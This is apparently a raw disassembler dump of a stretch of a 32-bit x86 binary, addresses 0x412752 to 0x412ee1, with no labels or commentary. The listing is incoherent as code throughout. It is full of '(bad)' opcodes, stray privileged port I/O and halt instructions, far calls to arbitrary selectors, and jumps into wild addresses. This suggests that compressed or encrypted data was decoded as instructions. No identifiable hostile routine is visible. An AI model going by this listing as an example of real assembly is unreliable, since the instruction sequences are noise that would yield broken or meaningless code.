  412752:	inc    edx
  412753:	retf   
  412754:	push   0xffffff93
  412756:	imul   ecx,DWORD PTR [ecx],0xffffffa9
  412759:	xchg   ecx,eax
  41275a:	fcomp  DWORD PTR ds:0x16455381
  412760:	mov    ecx,0x574b22f2
  412765:	add    DWORD PTR gs:[esi],edi
  412768:	sub    eax,0x8630dd3c
  41276d:	pop    eax
  41276e:	and    al,0x5b
  412770:	adc    ebp,ebx
  412772:	mul    BYTE PTR [eax+0x673fe38a]
  412778:	cmp    DWORD PTR [esi],0x24
  41277b:	nop
  41277c:	sub    al,0x27
  41277e:	iret   
  41277f:	xor    DWORD PTR [ebp-0x15],ebp
  412782:	imul   eax,esp,0x8f60e759
  412788:	mov    edi,0x3549a5e4
  41278d:	sub    BYTE PTR [ebp+0x14ef2b8c],dl
  412793:	(bad)  
  412794:	in     eax,0xb9
  412796:	hlt    
  412797:	or     dl,bl
  412799:	fcompp 
  41279b:	adc    ecx,DWORD PTR [esi-0x53]
  41279e:	xchg   esi,eax
  41279f:	jne    0x4127d6
  4127a1:	push   ebp
  4127a2:	fist   DWORD PTR ds:0x1c25eb76
  4127a8:	jno    0x4127df
  4127aa:	loope  0x4127a0
  4127ac:	pop    edi
  4127ad:	push   ds
  4127ae:	sbb    al,0x4c
  4127b0:	push   cs
  4127b1:	mov    ecx,0xc00347f5
  4127b6:	sub    edx,eax
  4127b8:	jae    0x412772
  4127ba:	add    DWORD PTR [eax],esp
  4127bc:	lea    edx,[edx-0x4749b0fb]
  4127c2:	(bad)  
  4127c3:	sahf   
  4127c4:	iret   
  4127c5:	clc    
  4127c6:	push   ebp
  4127c7:	add    DWORD PTR [edx+0x19],0x1f
  4127cb:	in     eax,dx
  4127cc:	fimul  DWORD PTR [esi+0x7a]
  4127cf:	shl    ebx,1
  4127d1:	dec    esp
  4127d2:	test   DWORD PTR [esi+ecx*8+0x4a3fc3e7],0xdb2f7e13
  4127dd:	add    esp,DWORD PTR [edi-0x4cded158]
  4127e3:	fcmovbe st,st(7)
  4127e5:	mov    eax,0xd3d2470c
  4127ea:	ins    DWORD PTR es:[edi],dx
  4127eb:	ss sub cl,bh
  4127ee:	sbb    bl,al
  4127f0:	or     ecx,esi
  4127f2:	and    BYTE PTR [ecx],cl
  4127f4:	sahf   
  4127f5:	imul   ecx,esp,0x4b36550d
  4127fb:	pop    edi
  4127fc:	xor    BYTE PTR ds:0xaca91698,dh
  412802:	push   edi
  412803:	je     0x4127dc
  412805:	jg     0x4127d3
  412807:	fstp   TBYTE PTR [edi-0x23]
  41280a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41280b:	aad    0xbd
  41280d:	mov    ah,0x38
  41280f:	cmp    ch,bh
  412811:	xchg   ebp,eax
  412812:	retf   
  412813:	sub    al,0xaa
  412815:	push   es
  412816:	arpl   ax,si
  412818:	xor    eax,0x52aa9f93
  41281d:	gs (bad) 
  41281f:	(bad)  [ecx]
  412821:	sbb    BYTE PTR [edi-0x40],bl
  412824:	pop    esi
  412825:	push   ecx
  412826:	push   ecx
  412827:	(bad)  
  412829:	dec    ecx
  41282a:	xor    cl,BYTE PTR [edx+0xa]
  41282d:	mov    DWORD PTR [edx-0x8b7221f],esi
  412833:	les    edx,FWORD PTR [ebx+eiz*2-0x37d5d19a]
  41283a:	pop    esp
  41283b:	pushf  
  41283c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41283d:	mov    cl,0x2c
  41283f:	sti    
  412840:	adc    eax,0x531b8d14
  412845:	outs   dx,DWORD PTR ds:[esi]
  412846:	in     eax,0x2c
  412848:	(bad)  
  412849:	mov    al,0xeb
  41284b:	adc    BYTE PTR [edx-0x1cc36a55],bl
  412851:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412853:	mov    dh,0x1e
  412855:	nop
  412856:	adc    ah,BYTE PTR [ecx+0x57]
  412859:	mov    al,ds:0x70240e2f
  41285e:	outs   dx,BYTE PTR ds:[esi]
  41285f:	and    eax,DWORD PTR [esi+0x6e18d166]
  412865:	xchg   edi,eax
  412866:	mov    ebp,0x768133b
  41286b:	add    al,0xa6
  41286d:	xlat   BYTE PTR ds:[ebx]
  41286e:	mov    bl,0x95
  412870:	jmp    0x412864
  412872:	xor    al,BYTE PTR [edi+0x1e]
  412875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412876:	push   esi
  412877:	sbb    BYTE PTR [ebx-0x4aa7e3a9],bl
  41287d:	sub    al,0x72
  41287f:	shr    ecx,1
  412881:	idiv   BYTE PTR [eax]
  412883:	retf   0x6312
  412886:	sub    cl,BYTE PTR [esi]
  412888:	push   0xffffffcc
  41288a:	cmp    cl,BYTE PTR [eax]
  41288c:	cld    
  41288d:	xor    esi,DWORD PTR [ecx]
  41288f:	lahf   
  412890:	test   eax,0xae2960b4
  412895:	mov    esp,0x9a8d9f50
  41289a:	(bad)  ds:0x444a1c69
  4128a0:	mov    ch,0x1
  4128a2:	repz dec eax
  4128a4:	fwait
  4128a5:	push   ds
  4128a6:	jae    0x4128e4
  4128a8:	inc    ebp
  4128a9:	jne    0x4128ea
  4128ab:	jns    0x41283d
  4128ad:	inc    esi
  4128ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128af:	call   0x4897:0xf953b963
  4128b6:	fdivr  st(3),st
  4128b8:	fdiv   st,st(2)
  4128ba:	push   ecx
  4128bb:	in     eax,0x1f
  4128bd:	xor    eax,0x39425b8d
  4128c2:	out    0x42,al
  4128c4:	mov    DWORD PTR [edi+0x1d38eef1],ecx
  4128ca:	fsubr  DWORD PTR [esi]
  4128cc:	call   0x1b1e00d1
  4128d1:	stos   DWORD PTR es:[edi],eax
  4128d2:	ds aaa 
  4128d4:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4128d6:	add    edx,esi
  4128d8:	xor    dh,BYTE PTR ds:0x75b838ce
  4128de:	inc    edx
  4128df:	cmc    
  4128e0:	imul   ebp,DWORD PTR [edi],0xbf2ae769
  4128e6:	mov    edx,0x428054f3
  4128eb:	and    BYTE PTR [ebp-0x714ec8ea],dl
  4128f1:	neg    DWORD PTR [edx+esi*2+0x52e45eee]
  4128f8:	xor    BYTE PTR [edi-0x17b7408e],dl
  4128fe:	vmread edi,esp
  412901:	and    DWORD PTR [ebx],ebp
  412903:	in     al,dx
  412904:	ja     0x41295f
  412906:	cdq    
  412907:	push   ds
  412908:	push   edi
  412909:	scas   al,BYTE PTR es:[edi]
  41290a:	xor    bh,bl
  41290c:	mov    ch,0xe8
  41290e:	jno    0x412909
  412910:	jmp    0xe83ba245
  412915:	ins    BYTE PTR es:[edi],dx
  412916:	mov    bl,0x60
  412918:	and    bl,BYTE PTR [eax-0x35]
  41291b:	mov    ebp,0x7e4f3759
  412920:	les    ecx,FWORD PTR [edi]
  412922:	adc    eax,0x915e3c30
  412927:	adc    ch,ch
  412929:	ins    BYTE PTR es:[edi],dx
  41292a:	mov    dl,0xe1
  41292c:	daa    
  41292d:	push   edi
  41292e:	fimul  DWORD PTR ds:0xe1e57eb2
  412934:	xchg   ecx,eax
  412935:	and    dh,BYTE PTR ds:0xa23b04e7
  41293b:	test   BYTE PTR [esi+0x53],0x2d
  41293f:	gs dec esp
  412941:	mov    ebx,0xe1923d6e
  412946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412947:	mov    al,0xe
  412949:	jbe    0x4129a6
  41294b:	out    dx,al
  41294c:	push   cs
  41294d:	mov    ebp,0x3b658949
  412952:	scas   eax,DWORD PTR es:[edi]
  412953:	(bad)  
  412954:	repz loop 0x4129bb
  412957:	ds stos BYTE PTR es:[edi],al
  412959:	dec    ebp
  41295a:	jl     0x412905
  41295c:	outs   dx,BYTE PTR ds:[esi]
  41295d:	loop   0x41299a
  41295f:	mov    ebx,0x7f24a8b4
  412964:	mov    DWORD PTR [ebx+0x42],edi
  412967:	sub    esp,DWORD PTR [eax]
  412969:	mov    dl,dl
  41296b:	push   esi
  41296c:	imul   eax,DWORD PTR [edi+0x27],0xff7c0af5
  412973:	ret    
  412974:	sub    DWORD PTR [ebx],eax
  412976:	or     al,0x75
  412978:	push   cs
  412979:	repz cmp al,ah
  41297c:	inc    ebp
  41297d:	test   eax,0x78ede68f
  412982:	ds in  eax,0x94
  412985:	and    DWORD PTR [edx],ecx
  412987:	sbb    ebx,DWORD PTR [edi-0x37]
  41298a:	cdq    
  41298b:	add    dl,BYTE PTR [esi-0x8]
  41298e:	aas    
  41298f:	xchg   edx,eax
  412990:	mov    ecx,0xe5b89f4f
  412995:	pop    ss
  412996:	scas   eax,DWORD PTR es:[edi]
  412997:	test   DWORD PTR [ebx],0xaac6c1f0
  41299d:	dec    DWORD PTR [ebx+0x1c886383]
  4129a3:	pushf  
  4129a4:	push   es
  4129a5:	cs ss mov al,0xe4
  4129a9:	xchg   ebp,ebx
  4129ab:	repnz cmp eax,0xbc521591
  4129b1:	(bad)  
  4129b2:	in     eax,0x8e
  4129b4:	add    bh,BYTE PTR [edx+0x692d27c]
  4129ba:	stos   DWORD PTR es:[edi],eax
  4129bb:	pop    esp
  4129bc:	sbb    edi,eax
  4129be:	nop
  4129bf:	les    esp,FWORD PTR [edx-0x2e4ef6b8]
  4129c5:	mov    ds:0xe8383672,eax
  4129ca:	dec    edi
  4129cb:	inc    esi
  4129cc:	and    ch,bh
  4129ce:	lods   eax,DWORD PTR ds:[esi]
  4129cf:	pop    ss
  4129d0:	mov    ch,0x54
  4129d2:	ss rcr bl,0x1d
  4129d6:	cmp    eax,0x9a9fe3e3
  4129db:	and    DWORD PTR [edi-0x7f741393],edi
  4129e1:	test   DWORD PTR [edx+0x58],ebx
  4129e4:	inc    ecx
  4129e5:	retf   0x617c
  4129e8:	int3   
  4129e9:	and    eax,ebx
  4129eb:	pop    ecx
  4129ec:	aas    
  4129ed:	stos   DWORD PTR es:[edi],eax
  4129ee:	dec    eax
  4129ef:	add    BYTE PTR [edx-0xe],bh
  4129f2:	jae    0x412981
  4129f4:	mov    esp,0xc1e2597c
  4129f9:	fsub   DWORD PTR [esi+0x7d7aa6c6]
  4129ff:	enter  0xba64,0x1a
  412a03:	es jns 0x4129fe
  412a06:	enter  0xd7cf,0xb2
  412a0a:	dec    ebp
  412a0b:	push   ds
  412a0c:	and    ebp,ebx
  412a0e:	sub    BYTE PTR [ecx],0x74
  412a11:	inc    edi
  412a12:	add    DWORD PTR ds:0x986415c1,ecx
  412a18:	push   ecx
  412a19:	ja     0x412a04
  412a1b:	mov    ebp,0x13355d5e
  412a20:	das    
  412a21:	jno    0x412a1a
  412a23:	push   esp
  412a24:	push   ss
  412a25:	push   edx
  412a26:	or     eax,DWORD PTR [ecx]
  412a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a29:	outs   dx,BYTE PTR ds:[esi]
  412a2a:	jnp    0x412a86
  412a2c:	imul   eax,DWORD PTR [edi+eax*1],0xffffffa8
  412a30:	inc    eax
  412a31:	(bad)  
  412a32:	inc    ecx
  412a33:	cs mov dh,0xd
  412a36:	push   0x7b
  412a38:	sub    DWORD PTR ds:0xeb7e2db4,0xc0f08feb
  412a42:	sbb    al,0x2a
  412a44:	mov    ds:0x78be102b,al
  412a49:	sub    eax,0xe58c463c
  412a4e:	std    
  412a4f:	jno    0x4129e2
  412a51:	mov    bh,0xfa
  412a53:	and    al,0x50
  412a55:	dec    ebp
  412a56:	inc    eax
  412a57:	fdivrp st(0),st
  412a59:	inc    eax
  412a5a:	xchg   eax,eax
  412a5c:	jle    0x412ac7
  412a5e:	jno    0x412a9e
  412a60:	push   0xfa08a2d8
  412a65:	pop    esi
  412a66:	jns    0x412a9a
  412a68:	cmova  eax,DWORD PTR [ebp+0x57]
  412a6c:	scas   eax,DWORD PTR es:[edi]
  412a6d:	or     DWORD PTR [edi-0x62b9ad4f],esi
  412a73:	outs   dx,BYTE PTR ds:[esi]
  412a74:	jg     0x412aac
  412a76:	inc    esi
  412a77:	ins    BYTE PTR es:[edi],dx
  412a78:	mov    al,0x2
  412a7a:	data16 mov bh,0xba
  412a7d:	jp     0x412a42
  412a7f:	xchg   esp,eax
  412a80:	std    
  412a81:	jne    0x412a7c
  412a83:	mov    WORD PTR [edi+0x38],?
  412a86:	out    0x5a,eax
  412a88:	dec    esp
  412a89:	xchg   BYTE PTR [edi+0x6a87b825],bl
  412a8f:	xor    DWORD PTR [edx],ecx
  412a91:	jmp    0xdc5e10ca
  412a96:	(bad)  
  412a97:	test   al,0xe5
  412a99:	mov    dh,0x61
  412a9b:	cmp    eax,0x3f19a008
  412aa0:	iret   
  412aa1:	dec    edx
  412aa2:	jno    0x412a8a
  412aa4:	sbb    al,0xb6
  412aa6:	outs   dx,DWORD PTR ds:[esi]
  412aa7:	push   eax
  412aa8:	loopne 0x412a88
  412aaa:	retf   0x31b5
  412aad:	jmp    0x412b02
  412aaf:	xor    esi,DWORD PTR [ebx]
  412ab1:	iret   
  412ab2:	and    DWORD PTR [ecx+0x560195f8],ebx
  412ab8:	fldcw  WORD PTR [esi-0x7a]
  412abb:	ja     0x412b1e
  412abd:	and    cl,dh
  412abf:	pop    esi
  412ac0:	loopne 0x412a82
  412ac2:	or     al,BYTE PTR [ebx+0x25]
  412ac5:	test   BYTE PTR gs:[edx-0x23],ch
  412ac9:	enter  0x3d54,0xe9
  412acd:	fld    QWORD PTR [esi+ecx*4]
  412ad0:	les    eax,FWORD PTR [esi+0x2e489de2]
  412ad6:	repnz push ss
  412ad8:	pusha  
  412ad9:	repnz cwde 
  412adb:	and    eax,0xac058d52
  412ae0:	int3   
  412ae1:	fwait
  412ae2:	sub    eax,0xeb2b6a8c
  412ae7:	ret    0x824d
  412aea:	bound  ebx,QWORD PTR [esp+eax*1+0x232afcf3]
  412af1:	das    
  412af2:	rcl    ch,cl
  412af4:	js     0x412ada
  412af6:	sub    eax,0x87bb9c70
  412afb:	pop    ds
  412afc:	add    ebx,DWORD PTR [eax]
  412afe:	out    dx,al
  412aff:	jb     0x412b68
  412b01:	cmc    
  412b02:	jg     0x412b14
  412b04:	ins    BYTE PTR es:[edi],dx
  412b05:	fstp   TBYTE PTR ds:[edx]
  412b08:	push   es
  412b09:	pop    ss
  412b0a:	stos   BYTE PTR es:[edi],al
  412b0b:	inc    eax
  412b0c:	and    ebp,DWORD PTR [ecx+0x2e]
  412b0f:	loopne 0x412aad
  412b11:	lock inc edx
  412b13:	mov    eax,ds:0x8f4b92f1
  412b18:	mov    gs,WORD PTR [eax-0x24c7676e]
  412b1e:	jnp    0x412acd
  412b20:	or     BYTE PTR [ebp-0x15],dh
  412b23:	loope  0x412ae9
  412b25:	mov    ebp,ebp
  412b27:	lods   al,BYTE PTR ds:[esi]
  412b28:	retf   
  412b29:	inc    eax
  412b2a:	inc    esi
  412b2b:	or     edi,esi
  412b2d:	(bad)  
  412b2e:	in     eax,dx
  412b2f:	sti    
  412b30:	ror    ebx,1
  412b32:	lock repz ja 0x412ad0
  412b36:	in     eax,dx
  412b37:	pusha  
  412b38:	loop   0x412b44
  412b3a:	test   DWORD PTR [edi],esi
  412b3c:	stc    
  412b3d:	xchg   esi,eax
  412b3e:	pop    esp
  412b3f:	push   0x5f1c410a
  412b44:	(bad)  
  412b45:	lea    ebp,[ecx-0x11]
  412b48:	pop    es
  412b49:	and    eax,DWORD PTR [edx-0x69af9cc9]
  412b4f:	pop    ss
  412b50:	mov    edi,0xe93f53e6
  412b55:	fnstenv [esi-0x20]
  412b58:	and    ebp,DWORD PTR cs:[esi]
  412b5b:	cmc    
  412b5c:	not    ah
  412b5e:	cdq    
  412b5f:	sahf   
  412b60:	enter  0xbbce,0x6e
  412b64:	fs dec eax
  412b66:	lea    edx,[ebx+0x3f]
  412b69:	popa   
  412b6a:	cs out dx,eax
  412b6c:	mov    ch,0x45
  412b6e:	(bad)  [ebx]
  412b70:	mov    DWORD PTR [eax+0x43a63985],ecx
  412b76:	std    
  412b77:	(bad)  [esi]
  412b79:	fucomi st,st(3)
  412b7b:	dec    edi
  412b7c:	mov    ah,0x1b
  412b7f:	dec    ecx
  412b80:	xlat   BYTE PTR ds:[ebx]
  412b81:	jno    0x412bef
  412b83:	xchg   edi,eax
  412b84:	xor    BYTE PTR [edx],0x43
  412b87:	cmp    BYTE PTR ds:0xaa230a8e,bh
  412b8d:	test   eax,0x2ac4086c
  412b92:	addr16 mov al,0xda
  412b95:	jmp    0xcd0e6bd3
  412b9a:	jne    0x412b75
  412b9c:	shl    DWORD PTR [edi-0x34e4d138],0x87
  412ba3:	xor    ah,cl
  412ba5:	sub    BYTE PTR [edi],ah
  412ba7:	sub    BYTE PTR [ecx],bh
  412ba9:	daa    
  412baa:	bound  esp,QWORD PTR [edx+ebx*2-0x1]
  412bae:	enter  0xb0e5,0xf4
  412bb2:	jbe    0x412b83
  412bb4:	jnp    0x412bc7
  412bb6:	not    BYTE PTR [edx-0x1b]
  412bb9:	dec    eax
  412bba:	xchg   ecx,eax
  412bbb:	mov    edx,0xdc6b3ec3
  412bc0:	scas   al,BYTE PTR es:[edi]
  412bc1:	mov    edi,esp
  412bc3:	push   eax
  412bc4:	(bad)  [edi+0x1b]
  412bc7:	push   edx
  412bc8:	enter  0x65a0,0xb1
  412bcc:	mov    al,ds:0xd60460fa
  412bd1:	shl    BYTE PTR [edi+0x25765838],0x9c
  412bd8:	push   ecx
  412bd9:	dec    esi
  412bda:	out    dx,al
  412bdb:	(bad)  
  412bdd:	out    dx,eax
  412bde:	jno    0x412c4c
  412be0:	nop
  412be1:	cwde   
  412be2:	cmp    eax,0x6ac230da
  412be7:	aad    0x22
  412be9:	jns    0x412c46
  412beb:	fistp  DWORD PTR [edx-0x6544ddad]
  412bf1:	mov    al,BYTE PTR [edi+0x44]
  412bf4:	and    BYTE PTR ds:0xe5da7100,0x54
  412bfb:	mov    bh,0x7e
  412bfd:	in     eax,0x86
  412bff:	dec    ecx
  412c00:	sbb    dh,BYTE PTR ss:[ebx+edi*2-0x170bbf36]
  412c08:	xor    BYTE PTR [edi],dl
  412c0a:	popa   
  412c0b:	jmpw   0x6bb2
  412c0f:	or     eax,DWORD PTR [eax-0x3eb54e0b]
  412c15:	jmp    0x412be0
  412c17:	icebp  
  412c18:	adc    eax,0x136ba821
  412c1d:	pop    ebp
  412c1e:	sub    ah,ah
  412c20:	inc    esp
  412c21:	addr16 std 
  412c23:	icebp  
  412c24:	dec    esp
  412c25:	xor    al,0x77
  412c27:	jmp    0xce278f3b
  412c2c:	push   eax
  412c2d:	fsub   st(6),st
  412c2f:	sub    eax,0x2720d50
  412c34:	push   esi
  412c35:	or     DWORD PTR [ebp+0x6798993b],0xffffffeb
  412c3c:	sbb    esp,DWORD PTR [ebp+ebx*8+0x52]
  412c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c41:	and    BYTE PTR [edx+0x2109d82],dl
  412c47:	(bad)  
  412c48:	test   eax,0xe277d19f
  412c4d:	loope  0x412c60
  412c4f:	lahf   
  412c50:	out    dx,al
  412c51:	jp     0x412c3c
  412c53:	clc    
  412c54:	shl    BYTE PTR [edi],0xb7
  412c57:	xchg   edi,eax
  412c58:	jecxz  0x412bdf
  412c5a:	aad    0x38
  412c5c:	dec    esi
  412c5d:	jmp    0x2fe5362b
  412c62:	xchg   ecx,eax
  412c63:	out    0x70,eax
  412c65:	and    bh,ch
  412c67:	jne    0x412c3a
  412c69:	mov    ecx,0xc95281b0
  412c6e:	cmc    
  412c6f:	and    eax,0x6d29d144
  412c74:	mov    ?,WORD PTR [ecx]
  412c76:	mov    edx,0xd904f1f4
  412c7b:	(bad)  
  412c7c:	jmp    edx
  412c7e:	mov    cl,0x73
  412c80:	aaa    
  412c81:	jnp    0x412cbe
  412c83:	cmp    ecx,ecx
  412c85:	xchg   esp,eax
  412c86:	mov    ds:0x33db8ed,eax
  412c8b:	out    0xa6,eax
  412c8d:	inc    edx
  412c8e:	lods   eax,DWORD PTR ds:[esi]
  412c8f:	hlt    
  412c90:	jns    0x412d06
  412c92:	into   
  412c93:	iret   
  412c94:	fisubr WORD PTR ds:0xf888f895
  412c9a:	and    eax,0x8bc2d545
  412c9f:	mov    ss,WORD PTR [edi+0x25]
  412ca2:	cs jo  0x412caf
  412ca5:	sbb    esi,DWORD PTR [edx-0x5a]
  412ca8:	daa    
  412ca9:	aaa    
  412caa:	or     al,0xf3
  412cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cad:	in     eax,dx
  412cae:	inc    eax
  412caf:	es pushf 
  412cb1:	out    dx,al
  412cb2:	xchg   edi,eax
  412cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb4:	and    eax,DWORD PTR [ebx-0x50b92881]
  412cba:	and    ah,BYTE PTR [ebx]
  412cbc:	imul   BYTE PTR [edx+eiz*2-0x16]
  412cc0:	fsub   QWORD PTR [ecx]
  412cc2:	retf   
  412cc3:	ret    
  412cc4:	repnz lahf 
  412cc6:	sti    
  412cc7:	shr    BYTE PTR [esp+ebx*8-0x4d],cl
  412ccb:	dec    eax
  412ccc:	repz inc eax
  412cce:	jg     0x412c73
  412cd0:	and    DWORD PTR [esi],ebp
  412cd2:	push   0x5f
  412cd4:	mov    esi,0x2e62272
  412cd9:	stos   DWORD PTR es:[edi],eax
  412cda:	fnstenv [edx+0x1c]
  412cdd:	mov    ds:0x75c33b7a,al
  412ce2:	sub    ah,bh
  412ce4:	cmc    
  412ce5:	hlt    
  412ce6:	sub    eax,0x15660752
  412ceb:	mov    dl,BYTE PTR [edi+0x74e1baa2]
  412cf1:	fisttp DWORD PTR [eax+0x5779d49]
  412cf7:	mov    ebp,0x3a4759ef
  412cfc:	jp     0x412d6a
  412cfe:	pop    ebp
  412cff:	add    eax,0x25ddf270
  412d04:	mul    BYTE PTR [ecx+0x6a]
  412d07:	(bad)  
  412d08:	ficom  WORD PTR [edx+esi*4-0x57]
  412d0c:	lods   al,BYTE PTR ds:[esi]
  412d0d:	ins    DWORD PTR es:[edi],dx
  412d0e:	mov    edi,edx
  412d10:	iret   
  412d11:	mov    al,dh
  412d13:	repz dec ebx
  412d15:	scas   eax,DWORD PTR es:[edi]
  412d16:	mov    ah,0x75
  412d18:	push   cs
  412d19:	ins    BYTE PTR es:[edi],dx
  412d1a:	cmp    dh,BYTE PTR [eax+0x79]
  412d1d:	out    dx,eax
  412d1e:	mov    ds:0x6c4b8126,al
  412d23:	mov    ebx,0x7984a997
  412d28:	pop    ebp
  412d29:	mov    bl,0xd8
  412d2b:	or     esi,DWORD PTR [eax-0x57]
  412d2e:	or     ch,BYTE PTR [esi+0x74]
  412d31:	dec    edi
  412d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d33:	shl    BYTE PTR [esi],1
  412d35:	inc    ebp
  412d36:	jecxz  0x412d9c
  412d38:	jnp    0x412d0f
  412d3a:	outs   dx,DWORD PTR ds:[esi]
  412d3b:	stos   BYTE PTR es:[edi],al
  412d3c:	mov    cl,BYTE PTR ds:0xf06cc888
  412d42:	and    al,0x3e
  412d44:	mov    DWORD PTR [ebp-0x172cc8aa],esi
  412d4a:	mov    edx,0xbe44a29b
  412d4f:	push   ds
  412d50:	adc    eax,0xccbe101d
  412d55:	push   ss
  412d56:	jmp    0x412d1b
  412d58:	push   cs
  412d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d5a:	cmp    ch,BYTE PTR [eax+0x12]
  412d5d:	(bad)
  412d60:	push   edx
  412d61:	sbb    cl,ah
  412d63:	mov    bh,0x29
  412d65:	sbb    ebx,DWORD PTR [esi]
  412d67:	inc    eax
  412d68:	and    al,0xd4
  412d6a:	daa    
  412d6b:	push   ss
  412d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d6d:	dec    esi
  412d6e:	imul   eax,DWORD PTR [edx-0x7cc0e2c4],0x1a832878
  412d78:	and    ebp,DWORD PTR [edx+0x7a44cc29]
  412d7e:	jg     0x412dc4
  412d80:	fnsave [edx]
  412d82:	and    BYTE PTR [esi],bh
  412d84:	mov    dh,0xad
  412d86:	jmp    0x412d87
  412d88:	pop    edi
  412d89:	pop    ss
  412d8a:	add    esi,0x1a
  412d8d:	mov    edi,0xde759f18
  412d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d93:	stos   DWORD PTR es:[edi],eax
  412d94:	mov    bh,0x2
  412d96:	push   ds
  412d97:	cld    
  412d98:	pop    es
  412d99:	sub    BYTE PTR [eax],cl
  412d9b:	pop    ds
  412d9c:	lods   eax,DWORD PTR ds:[esi]
  412d9d:	in     eax,dx
  412d9e:	addr16 jo 0x412e09
  412da1:	and    eax,0x7d88cf41
  412da6:	daa    
  412da7:	fwait
  412da8:	mov    edx,ebx
  412daa:	ret    
  412dab:	xchg   BYTE PTR [ecx+0x6b],ah
  412dae:	mov    esi,0x2e554db6
  412db3:	mov    al,0xc8
  412db5:	push   esi
  412db6:	inc    esi
  412db7:	mov    ebp,0x8fa1212d
  412dbc:	and    ebp,DWORD PTR [ebx-0x74]
  412dbf:	pop    es
  412dc0:	fisubr DWORD PTR ds:0x862ca9f2
  412dc6:	int    0xf4
  412dc8:	xchg   esi,eax
  412dc9:	dec    edx
  412dca:	mov    edi,DWORD PTR [ebx+0xe]
  412dcd:	ja     0x412e3c
  412dcf:	add    al,BYTE PTR [edx-0x55]
  412dd2:	mov    edi,0xbf6c97af
  412dd7:	hlt    
  412dd8:	jns    0x412da7
  412dda:	test   al,0x91
  412ddc:	ins    BYTE PTR es:[edi],dx
  412ddd:	pop    eax
  412dde:	rcl    BYTE PTR [ebx],0xd
  412de1:	outs   dx,DWORD PTR ds:[esi]
  412de2:	cdq    
  412de3:	jns    0x412dd1
  412de5:	rcr    esi,1
  412de7:	mov    ah,0xda
  412de9:	xor    DWORD PTR [edi],edx
  412deb:	sbb    eax,0x3d98f7d3
  412df0:	sbb    eax,0x15d785df
  412df5:	clc    
  412df6:	inc    ebx
  412df7:	jo     0x412ddd
  412df9:	dec    ecx
  412dfa:	mov    ebp,0x57bab700
  412dff:	loop   0x412e63
  412e01:	hlt    
  412e02:	hlt    
  412e03:	je     0x412dcc
  412e05:	cvttps2pi mm1,xmm4
  412e08:	scas   eax,DWORD PTR es:[edi]
  412e09:	popf   
  412e0a:	jg     0x412e61
  412e0c:	pop    edi
  412e0d:	pop    esp
  412e0e:	pusha  
  412e0f:	jle    0x412e31
  412e11:	cli    
  412e12:	jp     0x412ddf
  412e14:	rol    BYTE PTR [ecx],1
  412e16:	push   cs
  412e17:	data16 in al,0xa0
  412e1a:	shl    BYTE PTR [edx],cl
  412e1c:	xchg   ebx,eax
  412e1d:	adc    ch,BYTE PTR [eax+edx*8]
  412e20:	mov    eax,ds:0xb24a9152
  412e25:	jecxz  0x412e34
  412e27:	inc    ebp
  412e28:	jge    0x412dee
  412e2a:	mov    al,ds:0xa731b508
  412e2f:	and    DWORD PTR [edx-0x6f],eax
  412e32:	add    cl,BYTE PTR [ecx]
  412e34:	xor    bh,BYTE PTR [ebx+0x15afd94e]
  412e3a:	arpl   WORD PTR [ecx-0x5e],cx
  412e3d:	repnz out 0xcd,al
  412e40:	ss xchg edi,eax
  412e42:	cdq    
  412e43:	cmp    eax,0xcc8782d6
  412e48:	out    dx,al
  412e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e4a:	sbb    dl,BYTE PTR [ebx-0x64f30984]
  412e50:	mov    ds:0x1fa445d8,al
  412e55:	inc    ecx
  412e56:	push   esp
  412e57:	data16 daa 
  412e59:	loop   0x412e96
  412e5b:	pop    edi
  412e5c:	das    
  412e5d:	push   edi
  412e5e:	mov    esi,0xe31deff1
  412e63:	jno    0x412e71
  412e65:	outs   dx,BYTE PTR ds:[esi]
  412e66:	(bad)  
  412e67:	push   eax
  412e68:	inc    ecx
  412e69:	sub    DWORD PTR [di],ecx
  412e6c:	loope  0x412e0d
  412e6e:	shl    DWORD PTR [eax-0x420153cc],1
  412e74:	pop    ecx
  412e75:	xor    eax,0xcce96932
  412e7a:	retf   0xf408
  412e7d:	xor    eax,DWORD PTR [ebx-0x4c]
  412e80:	das    
  412e81:	(bad)
  412e84:	mov    al,ds:0xe2a54cac
  412e89:	imul   ebx,DWORD PTR [ebp+0xc1d8eef],0xffffffc6
  412e90:	xchg   ecx,eax
  412e91:	(bad)  
  412e92:	cli    
  412e93:	inc    ebx
  412e94:	xchg   DWORD PTR [ebx-0x1e],eax
  412e97:	loope  0x412e4d
  412e99:	clc    
  412e9a:	bts    edi,ecx
  412e9d:	jo     0x9f5794b8
  412ea3:	mov    esi,0xf5ef5dc4
  412ea8:	cmp    ah,BYTE PTR [ebx-0x59]
  412eab:	stos   DWORD PTR es:[edi],eax
  412eac:	cmp    eax,0xa2efc175
  412eb1:	jno    0x412eb0
  412eb3:	mov    eax,ds:0x9bf6a056
  412eb8:	xchg   ebx,eax
  412eb9:	pop    ecx
  412eba:	inc    ebp
  412ebb:	out    0x6c,eax
  412ebd:	test   BYTE PTR [esi+0x593e4b17],ch
  412ec3:	outs   dx,BYTE PTR ds:[esi]
  412ec4:	(bad)  
  412ec5:	and    edi,DWORD PTR ss:[ebp+0x2e7715ec]
  412ecc:	push   ecx
  412ecd:	mov    edx,0x4ae4eb16
  412ed2:	sbb    dl,BYTE PTR [eax]
  412ed4:	push   ecx
  412ed5:	jbe    0x412f53
  412ed7:	mov    esi,cs
  412ed9:	mov    ecx,DWORD PTR [esi]
  412edb:	push   0x19
  412edd:	xchg   esp,eax
  412ede:	sub    ch,al
  412ee0:	scas   eax,DWORD PTR es:[edi]
  412ee1:	outs   dx,BYTE PTR ds:[esi]
